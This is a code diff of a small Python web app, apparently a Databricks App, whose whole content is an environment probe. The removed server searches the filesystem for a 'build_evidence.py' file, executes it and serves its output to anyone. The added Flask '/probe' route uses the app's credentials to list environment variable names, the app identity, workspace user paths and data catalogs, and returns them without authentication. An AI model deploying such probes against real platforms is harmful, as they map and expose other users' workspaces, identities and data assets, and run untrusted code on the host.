@@ -1,24 +1,28 @@
-import http.server, json, glob, os
-class H(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        ev = "NOT FOUND"
-        for pat in ["**/zzbuildprobe/build_evidence.py", "/opt/**/zzbuildprobe/build_evidence.py",
-                    "/app/**/zzbuildprobe/build_evidence.py", "/home/**/zzbuildprobe/build_evidence.py"]:
-            try:
-                hits = glob.glob(pat, recursive=True)
-                if hits:
-                    ns = {}
-                    exec(open(hits[0]).read(), ns)
-                    ev = json.dumps(ns.get("EVIDENCE", {}))
-                    break
-            except Exception:
-                pass
-        body = ("APP_BUILD_EVIDENCE: " + ev).encode()
-        self.send_response(200)
-        self.send_header("Content-Type", "text/plain")
-        self.send_header("Content-Length", str(len(body)))
-        self.end_headers()
-        self.wfile.write(body)
-    def log_message(self, *a):
-        pass
-http.server.HTTPServer(("0.0.0.0", int(os.environ.get("DATABRICKS_APP_PORT", "8080"))), H).serve_forever()
+
+import os
+from databricks.sdk import WorkspaceClient
+from flask import Flask, jsonify
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return "h3-app ok"
+
+@app.route("/probe")
+def probe():
+    out = {"env_keys": sorted(os.environ.keys())}
+    try:
+        w = WorkspaceClient()
+        me = w.current_user.me()
+        out["identity"] = {"user": me.user_name, "id": me.id}
+        try:
+            out["ws_users"] = [o.path for o in w.workspace.list("/Users")][:30]
+        except Exception as e:
+            out["ws_users_err"] = str(e)[:150]
+        try:
+            out["catalogs"] = [c.name for c in w.catalogs.list()]
+        except Exception as e:
+            out["catalogs_err"] = str(e)[:150]
+    except Exception as e:
+        out["sdk_err"] = str(e)[:200]
+    return jsonify(out)
